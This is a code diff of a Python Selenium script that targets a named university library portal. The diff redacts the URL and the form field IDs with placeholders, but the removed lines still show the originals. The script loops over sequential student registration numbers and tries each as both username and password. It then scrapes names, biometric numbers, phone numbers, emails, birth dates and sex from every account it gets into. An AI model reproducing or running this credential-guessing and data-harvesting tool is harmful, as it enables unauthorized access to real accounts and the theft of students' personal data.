@@ -27,7 +27,7 @@ def setup():
     except Exception as e:
         print("[!] Web-Driver Not Found")
     try:
-        base_url = "http://webopac.vit.ac.in/cgi-bin/koha/opac-main.pl?logout.x=1"
+        base_url = "{{ hidden }}"
         driver.get(base_url)
     except:
         print('[!] Error in opening URL')
@@ -55,19 +55,19 @@ def info(year, branch, number):
     registeration_number = year+branch+number
     
     try:
-        name=driver.find_element_by_xpath('//*[@id="borrower_surname"]')
+        name=driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
         name_ = name.get_attribute('value')
     
-        bio = driver.find_element_by_xpath('//*[@id="borrower_othernames"]')
+        bio = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
         biometric_number = bio.get_attribute('value')
     
-        phone=driver.find_element_by_xpath('//*[@id="borrower_phone"]')
+        phone=driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
         phone_number = phone.get_attribute('value')
     
-        email = driver.find_element_by_xpath('//*[@id="borrower_email"]')
+        email = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
         email_ = email.get_attribute('value')
     
-        dob = driver.find_element_by_xpath('//*[@id="borrower_dateofbirth"]')
+        dob = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
         dob_ = dob.get_attribute('value')
         
         sex_m = driver.find_element_by_xpath('//*[@id="sex-male"]')
@@ -134,9 +134,12 @@ def padding(x):
 
 def ranger(year, branch, start):
     global driver
-    for number in range(start, 2901): #1, 2901 May be set manually
+    for number in range(start, 2901): #1, 2901 May be set manually , skip from 1001 to 1999
         number = padding(number)
         reg_no = year+branch+number
+      
+      {{ CODE SNIPPET HIDDEN }}
+      
         try:
             driver.find_element_by_xpath('//*[@id="userid"]').send_keys(reg_no)
             driver.find_element_by_xpath('//*[@id="password"]').send_keys(reg_no)
@@ -181,6 +184,7 @@ def ranger(year, branch, start):
 
 
 if __name__ == "__main__":
+   {{ CODE SNIPPET HIDDEN }}
     welcome()
     setup()
     start = int(input('Give Starting index: '))
